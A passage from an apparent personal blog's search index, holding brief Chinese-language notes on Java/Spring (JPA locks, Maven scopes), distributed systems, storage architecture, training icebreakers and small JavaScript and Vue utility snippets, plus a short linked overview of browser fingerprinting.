rel="noopener">https://blog.csdn.net/yongboyhood/article/details/81226553</a></li><li>JPA 教程 <a href="https://www.yiibai.com/jpa/jpa-introduction.html" target="_blank" rel="noopener">https://www.yiibai.com/jpa/jpa-introduction.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>elasticjob 分布式计划任务中间件</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/elasticjob/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/elasticjob/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://elasticjob.io" target="_blank" rel="noopener">http://elasticjob.io</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java JPA 行锁</title>
      <link href="/Spring/spring/java-jpa-lock/"/>
      <url>/Spring/spring/java-jpa-lock/</url>
      
        <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>当多个程序需要对同一个条数据访问，并发生争抢的情况，需要保证隔离性。例如在批量任务处理的场景下，job 1读取并更新一条数据时，job 2不应该修改这条数据。</p><p>原理为使用SQL的 select … for update 语句。当事务被提交后，锁应该被释放。</p><h2 id="使用JPA-实现"><a href="#使用JPA-实现" class="headerlink" title="使用JPA 实现"></a>使用JPA 实现</h2><p>JPA 中 Repository 中有如下定义：</p><pre><code>@Lock(value = LockModeType.PESSIMISTIC_WRITE)@Query(value = &quot;select t from Course t where t.id =?1 &quot;)Course queryAllById( Integer courseId);</code></pre><p>在业务代码中，应加上下面语句,当事务处理完后，for update才会将行级锁解除</p><pre><code>@Transactional(isolation = Isolation.READ_COMMITTED)</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/zc_ad/article/details/83578487" target="_blank" rel="noopener">https://blog.csdn.net/zc_ad/article/details/83578487</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Design thinking （设计思维）</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/design%20thinking/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/design%20thinking/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.sohu.com/a/202616234_708772" target="_blank" rel="noopener">http://www.sohu.com/a/202616234_708772</a>  斯坦福大学的超火神课： Design Thinking 到底是怎么回事儿？ </li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微服务异常处理</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/microservice-exception/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/microservice-exception/</url>
      
        <content type="html"><![CDATA[<p>在微服务调用中需要解决的一个问题是，怎么样远程调用看起来像使用本地方法。如果服务提供方抛出了异常，服务消费方可以直接catch，而不是在业务代码中解析HTTP的返回值等。</p><p>基本方案是服务的提供者使用 @ControllerAdvice 对异常进行输出包装（code、message），在调用方使用Feign 或者resttemplate 再转换成异常即可。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/wudimanong/archive/2019/04/15/10710923.html" target="_blank" rel="noopener">http://www.cnblogs.com/wudimanong/archive/2019/04/15/10710923.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>zoozie</title>
      <link href="/bigdata/bigdata/zoozie/"/>
      <url>/bigdata/bigdata/zoozie/</url>
      
        <content type="html"><![CDATA[<p>zoozie 是一个Hadoop的项目中用于任务编排，例如zoozie可以处理 spark 的任务。</p>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OpenResty</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/open-resty/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/open-resty/</url>
      
        <content type="html"><![CDATA[<p>OpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Seata</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/seata/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/seata/</url>
      
        <content type="html"><![CDATA[<p>Seata（曾用名Fescar,开源版本GTS）是阿里的开源分布式事务框架，其RoadMap中指出了其希望与社区合作重新构建出一个全面的分布式事务框架。</p>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>zookeeper</title>
      <link href="/bigdata/bigdata/zookeeper/"/>
      <url>/bigdata/bigdata/zookeeper/</url>
      
        <content type="html"><![CDATA[<p>Zookeeper 是一个分布式协调工具。在数据高可用的情况下，用来选主机。类似于 keepalived。</p><p>采用 raft 选举协议。</p><p>提供的特性</p><ul><li>管理配置信息</li><li>提供统一的命名服务</li><li>分布式状态同步</li><li>集群管理</li></ul><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>raft.github.io</li></ul>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Apache Mina</title>
      <link href="/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/mina/"/>
      <url>/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/mina/</url>
      
        <content type="html"><![CDATA[<p>Apache Mina 是一款网络通信框架，用来处理网络IO，提供低级、高级的网络相关的API。</p><p>类似框架：</p><ul><li>Grizzly</li><li>Netty 4</li><li>QuickServer</li><li>xSocket</li></ul><h2 id="https-en-wikipedia-org-wiki-Apache-MINA"><a href="#https-en-wikipedia-org-wiki-Apache-MINA" class="headerlink" title="https://en.wikipedia.org/wiki/Apache_MINA"></a><a href="https://en.wikipedia.org/wiki/Apache_MINA" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Apache_MINA</a></h2>]]></content>
      
      
      <categories>
          
          <category> 网络通信 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>maven 常见 scopes</title>
      <link href="/java/devops/maven-scopes/"/>
      <url>/java/devops/maven-scopes/</url>
      
        <content type="html"><![CDATA[<ol><li><p>compile 默认是compile。compile表示被依赖项目需要参与当前项目的编译，包括后续的测试，运行周期也参与其中，是一个比较强的依赖。打包的时候通常需要包含进去。</p></li><li><p>test 表示依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。比较典型的如junit</p></li><li><p>runtime 表示被依赖项目无需参与项目的编译，不过后期的测试和运行周期需要其参与。与compile相比，跳过编译而已。在终端的项目（非开源，企业内部系统.中，和compile区别不是很大。比较常见的如JSRXXX的实现，对应的API jar是compile，具体实现是runtime的，compile只需要知道接口就足够了。oracle jdbc驱动jar包就是一个很好的例子，一般scope为runtime。  另runtime的依赖通常和optional搭配使用，optional为true。即可以用A实现也可以用B实现。</p></li><li><p>provide 意味着打包的时候可以不用包进去，别的设施（web container.会提供。事实上该依赖理论上可以参与编译、测试、运行等周期。相当于compile，但是打包阶段做了exclude的动作。</p></li><li><p>system 和provide相同，不过被依赖项不会从maven仓库抓，而是从本地系统文件拿，一定要配合systemPath使用</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 中常见的测试方案</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-testing/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-testing/</url>
      
        <content type="html"><![CDATA[<ul><li>单元测试</li><li>Spring mvc 下的集成测试</li><li>Spring boot 下的集成测试</li><li>Pact 测试</li><li>API 测试</li><li>JMH 微基准测试</li></ul><h2 id="常用的mock-工具"><a href="#常用的mock-工具" class="headerlink" title="常用的mock 工具"></a>常用的mock 工具</h2><ul><li>Powermock</li><li>Mockito</li><li>wiremock</li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JHipster</title>
      <link href="/java/devops/jhipster/"/>
      <url>/java/devops/jhipster/</url>
      
        <content type="html"><![CDATA[<p>一个Java脚手架, 用于生成，开发，部署Spring Boot + Angular/React Web Application和Spring microservices。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://www.jhipster.tech/" target="_blank" rel="noopener">https://www.jhipster.tech/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>spring-restdocs-asciidoctor</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/spring-restdocs-asciidoctor/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/spring-restdocs-asciidoctor/</url>
      
        <content type="html"><![CDATA[<p>Spring 提供的一套 rest API 文档生成工具，通过 adoc 文件生成漂亮的 API 文档。</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><ul><li>使用契约文件</li><li>使用 Swagger</li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CAP 理论</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/cap/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/cap/</url>
      
        <content type="html"><![CDATA[<p>CAP原则又称CAP定理，指的是在一个分布式系统中，Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性）。</p><p>实际上 CAP 理论中分区容错性必须要求，所以现实分布式系统中就变成 CP 和 AP 中选择。</p>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Prometheus 开源设备监控平台</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/prometheus/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/prometheus/</url>
      
        <content type="html"><![CDATA[<p>Prometheus 是一个监控设备运行情况的工具，例如CPU、内存、网络使用率等信息。并能及时发出告警。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://prometheus.io/docs/introduction/overview/" target="_blank" rel="noopener">https://prometheus.io/docs/introduction/overview/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>thrift RPC 调用框架</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/thrift/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/thrift/</url>
      
        <content type="html"><![CDATA[<p>Thrift是一种接口描述语言和二进制通讯协议，它被用来定义和创建跨语言的服务。它被当作一个远程过程调用（RPC）框架来使用，是由Facebook为“大规模跨语言服务开发”而开发的。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="http://thrift.apache.org/" target="_blank" rel="noopener">http://thrift.apache.org/</a> 官网</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>面向对象（oo）的几个原则</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/oo/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/oo/</url>
      
        <content type="html"><![CDATA[<ul><li>单一职责原则 一个类只做一个事</li><li>开闭原则 对拓展开放，对修改 封闭</li><li>李氏替换原则 子类能替换父类</li><li>依赖倒置原则 依赖接口，而不是依赖具体实现（service 依赖 dao，变成了dao 依赖 dao的接口）</li><li>接口隔离原则 使用多个独立的接口而不是一个大而全的接口</li><li>组合重用原则 使用组合而不是使用继承</li><li>命令查询分离 CQS 原则</li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>UML 基础</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/uml/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/uml/</url>
      
        <content type="html"><![CDATA[<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p>重要的一张图 </p><p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Uml_class_relation_arrows_en.svg.png" alt=""></p><p>常用的图示：</p><ul><li>继承父类 实线和三角形箭头</li><li>实现接口 虚线和三角箭头</li><li>依赖 虚线和箭头</li><li>关联 实线和箭头</li></ul><p>记住继承和实现即可</p>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>apollo 配置中心</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/apollo/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/apollo/</url>
      
        <content type="html"><![CDATA[<p>Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。</p><p>服务端基于Spring Boot和Spring Cloud开发，打包后可以直接运行，不需要额外安装Tomcat等应用容器。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://github.com/ctripcorp/apollo" target="_blank" rel="noopener">https://github.com/ctripcorp/apollo</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>标准技术下的软件开发</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/tech-standard/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/tech-standard/</url>
      
        <content type="html"><![CDATA[<h2 id="常见标准制定组织"><a href="#常见标准制定组织" class="headerlink" title="常见标准制定组织"></a>常见标准制定组织</h2><ul><li>IEEE </li><li>W3C</li><li>IETF</li><li><a href="https://en.wikipedia.org/wiki/Ecma_International" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Ecma_International</a> ECMA</li><li>OSGi</li><li>OMG <a href="https://en.wikipedia.org/wiki/Object_Management_Group" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Object_Management_Group</a></li></ul><h3 id="国内的标准"><a href="#国内的标准" class="headerlink" title="国内的标准"></a>国内的标准</h3><ul><li>SAC — Standardization Administration of China</li><li>CSSN — China Standards Information Center</li><li>GB/T</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/List_of_technical_standard_organisations" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/List_of_technical_standard_organisations</a></li></ul><h2 id="常见的技术标准"><a href="#常见的技术标准" class="headerlink" title="常见的技术标准"></a>常见的技术标准</h2><h3 id="Restful-相关"><a href="#Restful-相关" class="headerlink" title="Restful 相关"></a>Restful 相关</h3><ul><li>JAX-RS APIs</li><li>JSR 311 </li><li>JSR 339</li><li><a href="https://tools.ietf.org/html/rfc6570" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6570</a> URI Template</li><li><a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/" target="_blank" rel="noopener">https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/</a> RAML</li><li><a href="https://jsonapi.org/" target="_blank" rel="noopener">https://jsonapi.org/</a> </li></ul><h3 id="授权相关"><a href="#授权相关" class="headerlink" title="授权相关"></a>授权相关</h3><ul><li>OAuth2</li><li>LDAP</li></ul><h3 id="序列化相关"><a href="#序列化相关" class="headerlink" title="序列化相关"></a>序列化相关</h3><ul><li><a href="http://json.org/" target="_blank" rel="noopener">http://json.org/</a> </li><li><a href="https://www.w3.org/TR/REC-xml/" target="_blank" rel="noopener">https://www.w3.org/TR/REC-xml/</a> XML </li></ul><h3 id="Javascript-相关"><a href="#Javascript-相关" class="headerlink" title="Javascript 相关"></a>Javascript 相关</h3><ul><li>Ecma</li></ul><h3 id="测试相关"><a href="#测试相关" class="headerlink" title="测试相关"></a>测试相关</h3><ul><li>GB/T 15532-2008 测试类型定义</li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RESTEasy</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/Resteasy/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/Resteasy/</url>
      
        <content type="html"><![CDATA[<p>RESTEasy 是JBoss的开源项目之一,是一个RESTful Web Services框架。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://resteasy.github.io/" target="_blank" rel="noopener">https://resteasy.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Zipkin 分布式跟踪系统</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/zipkin/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/zipkin/</url>
      
        <content type="html"><![CDATA[<p>Zipkin 是一个分布式的追踪系统，每个应用程序向Zipkin报告定时数据，Zipkin UI呈现了一个依赖图表来展示多少跟踪请求经过了每个应用程序。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://zipkin.io/" target="_blank" rel="noopener">https://zipkin.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 原生的 service loader</title>
      <link href="/java/java/java-service-loader/"/>
      <url>/java/java/java-service-loader/</url>
      
        <content type="html"><![CDATA[<p>Java service loader 可以通过一个接口返回一组具体点实现，在实现策略模式时，特别有用。</p><p>在包 java.util.ServiceLoader 通过定义配置文件记载类的示例。</p><p>例如在 META-INF/services 中 定义一个文件，然后添加</p><pre><code>org.hadoop.java.HDFSServiceorg.hadoop.java.LocalService</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java unmodifiableMap</title>
      <link href="/java/java/unmodifiableMap/"/>
      <url>/java/java/unmodifiableMap/</url>
      
        <content type="html"><![CDATA[<p>集合中提供了一个防止修改的方法</p><pre><code>public final Map&lt;Foo, Bar&gt; getMap(){    ...    return Collections.unmodifiableMap(map);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>计算高可用方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/computed-architedture/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/computed-architedture/</url>
      
        <content type="html"><![CDATA[<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><ul><li>DNS 负载均衡</li><li>Nginx 应用层 负载均衡 大概 5W/s</li><li>LVS 网络层负载均衡 大概 80W/S</li><li>硬件负载均衡 大概 200W/s - 1000W/s</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>储存高性能架构</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/storage-architecture/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/storage-architecture/</url>
      
        <content type="html"><![CDATA[<p>常见方案</p><ul><li>读写分离</li><li>分库</li><li>分表<ul><li>水平切分</li><li>垂直切分</li></ul></li><li>使用No SQL </li><li>使用 Redis</li><li>使用 MemoCache</li><li>使用 Elastic Search</li><li>使用 Hbase 列数据库</li></ul><h2 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h2><p>MySQL 读写分离后很可能有1s 左右的延迟需要考虑，解决主从延迟的方案</p><ul><li>写操作后从主库完成读操作，缺点是对业务侵入较大</li><li>二次读取方案。先从从读取，如果没有读取成功，再从主机读取，可以从中间件层实施</li><li>关键业务从主机读取，例如用户信息，类似</li></ul><h2 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h2><p>常见问题：</p><ul><li>路由算法<ul><li>范围路由</li><li>HASH 路由</li><li>配置路由</li></ul></li><li>join 问题</li><li>count 问题</li><li>排序问题</li></ul><p>实现方案：</p><ul><li><p>代码层实现 </p><ul><li>TDDL Taobao Distributed data layer</li></ul></li><li><p>中间件</p><ul><li>阿里开源中间件 Drup</li><li>官方 mysql-proxy</li><li>奇虎开源中间件 Atals</li></ul></li></ul><p>分表经验：</p><ul><li>单表数据超过1000W 行就需要考虑分表</li></ul><h2 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h2><p>讲关系型数据库的内容转换成 json 输入给 Elastic Search 等全文数据库。</p>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GraphQL</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/graphQL/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/graphQL/</url>
      
        <content type="html"><![CDATA[<p>GraphQL是一个开源的API数据查询和操作语言及实现为了实现上述操作的相应运行环境。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>标准官方网站 <a href="http://graphql.org/" target="_blank" rel="noopener">http://graphql.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>影响图 (Influence diagram)</title>
      <link href="/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/influence-diagram/"/>
      <url>/%E7%90%86%E8%AE%BA%E6%96%B9%E6%B3%95/methodology/influence-diagram/</url>
      
        <content type="html"><![CDATA[<p>一种分析复杂问题的方法论，通过图表表达事物之间的关系和因果，即事物之间的相互影响。</p><p><img src="/理论方法/methodology/influence-diagram/simple-influence-diagram.svg" alt="例子"></p><p>例如：</p><p>天气预报-&gt;出行-&gt;心情</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ul><li><a href="https://en.wikipedia.org/wiki/Influence_diagram" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Influence_diagram</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>培训破冰游戏</title>
      <link href="/%E5%9F%B9%E8%AE%AD/training/training/"/>
      <url>/%E5%9F%B9%E8%AE%AD/training/training/</url>
      
        <content type="html"><![CDATA[<h2 id="破冰游戏"><a href="#破冰游戏" class="headerlink" title="破冰游戏"></a>破冰游戏</h2><h3 id="答问自我介绍"><a href="#答问自我介绍" class="headerlink" title="答问自我介绍"></a>答问自我介绍</h3><p>培训者站在一列，使用以系列的问题，让培训者分开，然后让小部分人进行自我介绍，通过问题让培训者相互了解，知道自我介绍完成。</p><p>问题列表：</p><ul><li>是否是本地人？</li><li>是否养宠物？</li><li>使用vim？</li><li>PHP是不是最好的语言？</li></ul><h3 id="human-bingo"><a href="#human-bingo" class="headerlink" title="human bingo"></a>human bingo</h3><p>参考地址：<a href="https://plentifun.com/sample-questions-to-play-human-bingo-game" target="_blank" rel="noopener">https://plentifun.com/sample-questions-to-play-human-bingo-game</a></p><h3 id="记住名字"><a href="#记住名字" class="headerlink" title="记住名字"></a>记住名字</h3><p>讲培训者分组，10分钟熟悉彼此，然后从一个人开始说出自己的名字，下一个人重复前面的人的名字然后加上自己的名字。</p>]]></content>
      
      
      <categories>
          
          <category> 培训 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 复制到剪贴板</title>
      <link href="/Javascript/javascript/copy-to-clipboard/"/>
      <url>/Javascript/javascript/copy-to-clipboard/</url>
      
        <content type="html"><![CDATA[<pre><code>/** * 复制到剪贴板 * @param object * @param compareBy */function copyToClipboard(value, document = window.document) {  const element = document.createElement(&#39;input&#39;)  element.style.opacity = 0  element.value = value  document.body.appendChild(element)  element.select()  setTimeout(function () {    element.remove()  }, 0)  return document.execCommand(&#39;copy&#39;)}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 对URL中path参数绑定</title>
      <link href="/Javascript/javascript/http-params-in-path/"/>
      <url>/Javascript/javascript/http-params-in-path/</url>
      
        <content type="html"><![CDATA[<p>拼接URL在前端不是很好，例如 ‘/cate/‘+ cateID +’/post/‘+ postID</p><p>可以写成 <code>/cate/:cateID/post/:postID</code></p><pre><code>export function getParamlisedPath(pathString, ...params) {  let result = pathString  params.forEach((value) =&gt; {    result = result.replace(/\:\w+/, value)  })  return result}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 常用正则和方法</title>
      <link href="/Javascript/javascript/javascript-regular/"/>
      <url>/Javascript/javascript/javascript-regular/</url>
      
        <content type="html"><![CDATA[<h2 id="数字格式化（每三位加逗号）"><a href="#数字格式化（每三位加逗号）" class="headerlink" title="数字格式化（每三位加逗号）"></a>数字格式化（每三位加逗号）</h2><pre><code>export const toThousands = num =&gt; {  return (num || 0).toString().replace(/(\d)(?=(?:\d{3})+$)/g, &#39;$1,&#39;)}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>移动Vue组件挂载点到body上</title>
      <link href="/Javascript/vue/vue-move-component-to-body/"/>
      <url>/Javascript/vue/vue-move-component-to-body/</url>
      
        <content type="html"><![CDATA[<p>非常有用的一个指令，可以移动组件到 body上，解决定位和全局遮罩等问题</p><pre><code>export const moveElementToBody = {  inserted(el) {    if (el) {      document.body.appendChild(el)    }  },  unbind(el) {    if (el.parentNode) {      el.parentNode.removeChild(el)    }  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web客户端追踪（cookie、浏览器指纹 ）</title>
      <link href="/%E5%AE%89%E5%85%A8/security/user-track/"/>
      <url>/%E5%AE%89%E5%85%A8/security/user-track/</url>
      
        <content type="html"><![CDATA[<p>Web客户端追踪，主要是指用户使用客户端（通常是指浏览器）访问Web网站时，Web服务器通过一系列手段对用户客户端进行标记和识别，进而关联和分析用户行为的技术。</p><p>解决类似禁用了 cookie 后如何识别用户身份和登录问题</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li>panopticlick 浏览器指纹监测工具 <a href="https://panopticlick.eff.org/" target="_blank" rel="noopener">https://panopticlick.eff.org/</a> </li><li>fingerprintjs 浏览器指纹JS库 <a href="http://valve.github.io/fingerprintjs/" target="_blank" rel="noopener">http://valve.github.io/fingerprintjs/</a></li><li>各种存放cookie的技术 <a href="https://github.com/samyk/evercookie" target="_blank" rel="noopener">https://github.com/samyk/evercookie</a></li><li>Web客户端追踪（上）—Cookie追踪 <a href="https://paper.seebug.org/227/" target="_blank" rel="noopener">https://paper.seebug.org/227/</a></li><li>Web客户端追踪（下）—浏览器指纹追踪 <a href="https://paper.seebug.org/229/" target="_blank" rel="noopener">https://paper.seebug.org/229/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ldap</title>
      <link href="/%E5%AE%89%E5%85%A8/security/ldap/"/>
      <url>/%E5%AE%89%E5%85%A8/security/ldap/</url>
      
